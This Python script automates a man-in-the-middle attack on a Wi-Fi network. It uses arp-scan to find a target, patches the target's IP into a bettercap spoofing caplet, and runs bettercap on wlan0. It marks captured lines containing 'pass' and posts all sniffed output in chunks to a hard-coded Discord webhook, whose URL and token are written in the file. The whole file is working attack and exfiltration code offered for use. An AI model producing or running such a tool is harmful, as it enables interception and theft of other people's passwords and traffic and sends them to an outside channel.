import os, time, re
import subprocess
import requests, json

def send_to_discord(webhook_url, message, max_retries=3):
    payload = {"content": message}
    for attempt in range(max_retries):
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code == 204:
                print("Notification sent successfully.")
                return True
            else:
                print(f"Failed to send notification. Status code: {response.status_code}")
                try:
                    error_details = response.json()
                    print(f"Error details: {json.dumps(error_details, indent=2)}")
                except ValueError:
                    print(f"Response content: {response.text}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")
        print(f"Retrying... ({attempt + 1}/{max_retries})")
        time.sleep(5)  # Wait for 5 seconds before retrying
    return False

def run_bettercap(webhook_url):
    command="arp-scan -l --interface wlan0 -T aa:aa:aa:aa:aa:aa | sed -n '3p' | awk '{print $1}'"
    while True:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        # Accessing the output
        output = result.stdout
        error = result.stderr
        if output:
            break
    print(output)
    print(error)
    def replace_word_at_position(file_path, line_number, word_position, new_word):
    # Read the file into a list of lines
        with open(file_path, 'r') as file:
            lines = file.readlines()
    # Ensure the specified line exists
        if line_number <= len(lines):
    # Get the specific line and split it into words
            line = lines[line_number - 1]
            words = line.split()
    # Ensure the specified word position exists
            if word_position <= len(words):
    # Replace the word at the specified position
                words[word_position - 1] = new_word
    # Join the words back into a line
                modified_line = ' '.join(words)
                lines[line_number - 1] = modified_line + '\n' # Add newline character
            else:
                print(f"Word position {word_position} exceeds the number of words in the line.")
        else:
            print(f"Line number {line_number} exceeds total number of lines {len(lines)}.")
   # Write the modified lines back to the file
        with open(file_path, 'w') as file:
            file.writelines(lines)
   
    # Example usage
    file_path = 'spoofbetter.cap' # Path to your .cap file
    line_number = 3 # Line number to modify (1-based index)
    word_position = 3 # Word position to replace (1-based index)
    new_word = output # New word to insert
    if re.match(r"^192", new_word):
        replace_word_at_position(file_path, line_number, word_position, new_word)
    else:
        print("previous caplet file: ")
        os.system("cat spoofbetter.cap")  
    bettercap_command = "bettercap -iface  wlan0 -caplet spoofbetter.cap"
    process = subprocess.Popen(bettercap_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output_batch = []
    start_time = time.time()
    while True:
        current_time = time.time()

        output = process.stdout.readline().decode().strip()
        if output == '' and process.poll() is not None:
            break
        if output:
            output_batch.append(output)
            print(output)
            output_batch.append(output)
            if 'pass' in output:
                output_batch.append("Pass detected************************ " + output)
        if current_time - start_time >= 10:
            if output_batch:
                message = "\n".join(output_batch)
                if len(message) > 2000:
                    # Split the message into chunks of 2000 characters each
                    chunks = [message[i:i + 2000] for i in range(0, len(message), 2000)]
                    for chunk in chunks:
                        success = send_to_discord(webhook_url, chunk)
                        if not success:
                            print("Failed to send the chunk after multiple attempts. Retrying the chunk in the next cycle...")
                            output_batch = [chunk]  # Only keep the failed chunk
                            break
                    else:
                        output_batch = []  # Clear batch only if all chunks are successful
                else:
                    success = send_to_discord(webhook_url, message)
                    if success:
                        output_batch = []  # Clear batch only if successful
                    else:
                        print("Failed to send the message after multiple attempts. Retrying the entire batch in the next cycle...")
            start_time = current_time

# usage
webhook_url = 'https://discord.com/api/webhooks/1240023981189234688/RgTaxs4gBPDTSFv3PRtyvExn89diOI8PYkWg9SB0DKu_yJ_XNbW48CONdEC7GNoMpcry'
run_bettercap(webhook_url) 



#succ= send_to_discord(webhook_url, "test")
